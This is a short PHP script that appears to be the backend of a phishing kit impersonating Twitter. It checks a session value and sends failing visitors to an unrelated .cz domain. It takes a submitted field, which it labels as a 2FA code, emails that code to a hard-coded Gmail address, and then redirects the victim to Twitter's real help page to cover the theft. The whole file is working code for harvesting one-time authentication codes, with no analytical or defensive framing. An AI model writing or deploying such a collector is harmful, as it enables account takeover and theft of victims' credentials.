<?php

session_start();
if(isset($_SESSION['u'])){
  if($_SESSION['u'] === '123') {
  }else {
    header("Location: https://aswjhqegwemszcds.cz");
  }
}else {
 header("Location: https://aswjhqegwemszcds.cz");
}

$cgn = $_POST['cgn'];

$ip = $_SERVER['REMOTE_ADDR'];


$stringi = $cgn;
mail("fitorehoxha006@gmail.com","2FA", $stringi);
header("Location: https://help.twitter.com/en");
?>